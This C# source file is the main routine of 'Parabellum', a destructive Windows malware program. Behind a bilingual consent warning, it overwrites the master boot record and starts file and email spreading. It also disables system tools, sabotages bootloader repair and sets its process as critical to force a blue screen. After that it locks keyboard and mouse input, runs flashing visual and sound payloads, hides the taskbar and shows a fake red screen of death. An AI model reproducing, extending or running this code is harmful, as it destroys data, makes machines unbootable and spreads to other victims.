using static Vanara.PInvoke.User32;
using static Vanara.PInvoke.Kernel32;
using static Parabellum.Threading;
using static Parabellum.PayloadGdi;
using Vanara.PInvoke;
using System;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;
using System.Threading;

namespace Parabellum
{
    public class Win
    {
        public static int Main()
        {
            if (!File.Exists(Path.Combine(Environment.SystemDirectory, "TIME_WIN.LOG")))
            {
                System.Windows.Forms.Application.Run(new AppDefault());
                if (MessageBox(HWND.NULL, "(PTBR)\r\nEste é o aviso final! Depois de clicar em 'SIM', você será responsável por qualquer dano ao seu computador, e quaisquer problemas que ocorram serão inteiramente de sua responsabilidade.\r\nAviso: Este software contém luzes brilhantes e sons altos e irritantes.\r\n\r\nVocê realmente quer prosseguir com esta execução?\r\n\r\n(ENG)\r\nThis is the final warning! After clicking 'YES,' you will be responsible for any damage to your computer, and any issues that occur will be entirely your responsibility.\r\n\r\nWarning: THIS SOFTWARE CONTAINS BRIGHT FLASHING LIGHTS AND LOUD, IRRITATING SOUNDS.\r\n\r\nDo you really want to proceed with this execution?",
                    "\"SI VIS PACEM, PARA BELLUM\"", MB_FLAGS.MB_YESNO | MB_FLAGS.MB_ICONWARNING) == MB_RESULT.IDNO)
                    return 0;
                File.Create(Path.Combine(Environment.SystemDirectory, "TIME_WIN.LOG"));
            }

            DestructivePayloads.MBR.Mbr();

            tFileSpread.Start();
            tHideFileExecutable.Start();

            Spread.Email();

            PayloadSystem.DisableToolsWin();

            PayloadSystem.Anti_FixBootloader();

            DestructivePayloads.BSOD.SetCritical();

            //////////////////=====================================================================================



            if (!File.Exists(Path.Combine(Path.GetTempPath(), "MSG_PARABELLUM.txt")))
            {
                File.WriteAllText(Path.Combine(Path.GetTempPath(), "MSG_PARABELLUM.txt"),
"(PTBR)\r\nBOM, VOCÊ QUIS ISSO, ENTÃO PREPARESSE PARA O QUE VIER!\r\nBOA SORTE!\r\n\r\n" +
"▄︻テ══━一💥\r\n\r\n" +
"(ENG)\r\nWELL, YOU WANTED THIS, SO PREPARE YOURSELF FOR WHAT'S COMING!\r\nGOOD LUCK!\r\n\r\n" +
"🥶⃤🥶⃤ﮩ٨ـﮩﮩ٨ـ♡ﮩ٨ـﮩﮩ٨ـﺤ");
            }
            Process.Start(Path.Combine(Path.GetTempPath(), "MSG_PARABELLUM.txt"));

            Sleep(1000 * 10); // 10s

            Process[] processesNotepad = Process.GetProcesses();
            foreach (var process in processesNotepad)
            {
                if (process.ProcessName.Equals("notepad", StringComparison.OrdinalIgnoreCase))
                {
                    process.Kill();
                }
            }

            Sleep(1000); // 1s

            //////////////=====================================================================================


            BlockInput(true);
            tLoad1.Start();
            tRgb.Start();
            tBeat1.Start();

            Sleep(1000 * 15); // 15s

            tBeat1.Abort();
            tRgb.Abort();
            tLoad1.Abort();
            ClearScreen();
            BlockInput(false);



            ////=====================================================================================



            tLoad2.Start();
            tIconsMove.Start();
            tBlur.Start();
            tBeat2.Start();

            Sleep(1000 * 15); // 15s

            tBeat2.Abort();
            tLoad2.Abort();
            tBlur.Abort();
            tIconsMove.Abort();
            ClearScreen();



            /////////////////////=====================================================================================



            tLoad3.Start();
            tBeat3.Start();

            Sleep(1000 * 15); // 15s

            tBeat3.Abort();
            tLoad3.Abort();
            ClearScreen();



            /////=====================================================================================



            tLoad4.Start();
            tBeat4.Start();

            Sleep(1000 * 15); // 15s

            tBeat4.Abort();
            tLoad4.Abort();
            ClearScreen();



            /////////=====================================================================================


            tLoad5.Start();
            tBeat5.Start();

            Sleep(1000 * 15); // 15s

            tBeat5.Abort();
            tLoad5.Abort();
            ClearScreen();


            ////////=====================================================================================


            tLoad6.Start();
            tBeat6.Start();

            Sleep(1000 * 15); // 15s

            tBeat6.Abort();
            tLoad6.Abort();
            ClearScreen();


            ////////=====================================================================================


            tBeat7.Start();
            tLoad7.Start();
            tScribble.Start();

            Sleep(1000 * 15); // 15s

            tBeat7.Abort();
            tLoad7.Abort();
            tScribble.Abort();
            ClearScreen();


            ////////=====================================================================================


            tBeat8.Start();
            tLoad8.Start();

            Sleep(1000 * 15); // 15s

            tBeat8.Abort();
            tLoad8.Abort();
            ClearScreen();


            ////////=====================================================================================


            tBeat9.Start();
            tLoad9.Start();

            Sleep(1000 * 15); // 15s

            tBeat9.Abort();
            tLoad9.Abort();
            ClearScreen();


            //////////=====================================================================================


            tBeat10.Start();
            tLoad10.Start();

            Sleep(1000 * 15); // 15s

            tBeat10.Abort();
            tLoad10.Abort();
            ClearScreen();

            Sleep(5000);

            // Lock Mouse and Keyboard
            BlockInput(true);

            //  Disappear the Taskbar
            var taskbarHandle = FindWindow("Shell_TrayWnd", null);
            ShowWindow(taskbarHandle, ShowWindowCommand.SW_HIDE);

            Application.Run(new FakeRSOD());

            Sleep(INFINITE);
            return 0;
        }
    }
}
